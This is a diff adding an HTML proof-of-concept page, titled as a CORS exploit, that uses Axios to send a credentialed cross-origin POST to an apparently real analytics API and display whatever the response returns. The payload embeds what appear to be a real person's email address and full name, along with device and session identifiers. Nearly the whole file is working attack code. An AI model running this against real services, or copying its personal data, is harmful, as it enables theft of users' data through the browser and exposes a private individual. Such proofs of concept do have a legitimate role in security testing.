@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC with Axios</title>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+  <h2>🔥 Exploiting CORS via Axios</h2>
+  <pre id="output">Sending request...</pre>
+
+  <script>
+    axios({
+      method: "POST",
+      url: "https://api.fstr.rocks/v1/event",
+      withCredentials: true,
+      headers: {
+        "Content-Type": "application/json"
+        // ❌ DO NOT add "Cookie", "Origin", "User-Agent", etc.
+        // 🚫 X-Fstr-Application-Key must only be added if CORS allows it
+      },
+      data: {
+        deviceId: "0db8f40d-1b11-4c7b-8cfb-16f2374abb26",
+        sessionId: "b192fe58-f2b0-422a-8d4e-c7b1c8185943",
+        events: [
+          {
+            eventId: "548846bd-27a1-4520-8177-db3672d6c8a7",
+            eventType: "view_web_page",
+            eventTypeRevision: 0,
+            dimensions: {
+              pageURL: "/entrar/otp-celular?email=amanitoama33@gmail.com",
+              name: "amani toama",
+              provider: "GOOGLE"
+            },
+            localTimestamp: "2025-07-09T21:47:13.569Z"
+          }
+        ],
+        sentAt: "2025-07-09T21:47:15.572Z"
+      }
+    })
+    .then(res => {
+      document.getElementById("output").textContent = "Success:\n\n" + JSON.stringify(res.data, null, 2);
+    })
+    .catch(err => {
+      document.getElementById("output").textContent = "Error:\n\n" + err;
+    });
+  </script>
+</body>
+</html>
